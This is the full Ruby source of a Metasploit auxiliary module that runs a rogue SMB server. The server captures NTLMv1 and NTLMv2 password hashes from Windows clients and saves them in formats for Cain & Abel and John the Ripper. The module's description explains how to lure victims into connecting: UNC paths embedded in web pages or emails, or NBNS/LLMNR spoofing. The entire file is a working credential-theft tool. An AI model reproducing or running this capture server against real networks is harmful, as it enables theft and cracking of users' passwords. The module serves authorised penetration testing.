##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'
require 'ruby_smb/gss/provider/ntlm'
require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Auxiliary
  include ::Msf::Exploit::Remote::SocketServer
  include ::Msf::Exploit::Remote::SMB::Server::HashCapture

  def initialize
    super({
      'Name' => 'Authentication Capture: SMB',
      'Description' => %q{
        This module provides a SMB service that can be used to capture the challenge-response
        password NTLMv1 & NTLMv2 hashes used with SMB1, SMB2, or SMB3 client systems.
        Responses sent by this service have by default a random 8 byte challenge string
        of format `\x11\x22\x33\x44\x55\x66\x77\x88`, allowing for easy cracking using
        Cain & Abel (NTLMv1) or John the ripper (with jumbo patch).

        To exploit this, the target system must try to authenticate to this
        module. One way to force an SMB authentication attempt is by embedding
        a UNC path (\\\\SERVER\\SHARE) into a web page or email message. When
        the victim views the web page or email, their system will
        automatically connect to the server specified in the UNC share (the IP
        address of the system running this module) and attempt to
        authenticate. Another option is using auxiliary/spoof/{nbns,llmnr} to
        respond to queries for names the victim is already looking for.

        Documentation of the above spoofing methods can be found by running `info -d`.
      },
      'Author' => [
        'hdm',                 # Author of original module
        'Spencer McIntyre',    # Creator of RubySMB::Server
        'agalway-r7',          # Port of existing module to use RubySMB::Server
        'sjanusz-r7',          # Port of existing module to use RubySMB::Server
      ],
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Capture', { 'Description' => 'Run SMB capture server' } ]],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction' => 'Capture'
    })

    register_options(
      [
        OptString.new('CAINPWFILE', [ false, 'Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can be a path.', nil ]),
        OptString.new('JOHNPWFILE', [ false, 'Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 hashes, each of which is stored in separate files. Can also be a path.', nil ]),
        OptString.new('CHALLENGE', [ false, 'The 8 byte server challenge. Set values must be a valid 16 character hexadecimal pattern. If unset a valid random challenge is used.' ], regex: /^([a-fA-F0-9]{16})$/),
        OptString.new('SMBDomain', [ true, 'The domain name used during SMB exchange.', 'WORKGROUP'], aliases: ['DOMAIN_NAME']),
        OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 445 ]),
        OptInt.new('TIMEOUT', [ true, 'Seconds that the server socket will wait for a response after the client has initiated communication.', 5])
      ]
    )

    deregister_options('SMBServerIdleTimeout')
  end

  def run
    @rsock = Rex::Socket::Tcp.create(
      'LocalHost' => bindhost,
      'LocalPort' => bindport,
      'Comm' => _determine_server_comm(bindhost),
      'Server' => true,
      'Timeout' => datastore['TIMEOUT'],
      'Context' =>
        {
          'Msf' => framework,
          'MsfExploit' => self
        }
    )

    ntlm_provider = HashCaptureNTLMProvider.new(
      listener: self
    )

    # Set domain name for all future server responses
    ntlm_provider.dns_domain = datastore['SMBDomain']
    ntlm_provider.dns_hostname = datastore['SMBDomain']
    ntlm_provider.netbios_domain = datastore['SMBDomain']
    ntlm_provider.netbios_hostname = datastore['SMBDomain']

    validate_smb_hash_capture_datastore(datastore, ntlm_provider)

    server = RubySMB::Server.new(
      server_sock: @rsock,
      gss_provider: ntlm_provider
    )

    print_status("Server is running. Listening on #{bindhost}:#{bindport}")

    server.run do
      print_line
      print_good 'Received SMB connection on Auth Capture Server!'
      true
    end
  end

  def on_ntlm_type3(address:, ntlm_type1:, ntlm_type2:, ntlm_type3:)
    report_ntlm_type3(
      address: address,
      ntlm_type1: ntlm_type1,
      ntlm_type2: ntlm_type2,
      ntlm_type3: ntlm_type3
    )
  end

  def cleanup
    begin
      @rsock.close if @rsock
    rescue StandardError => e
      elog('Failed closing SMB server socket', error: e)
    end

    super
  end
end
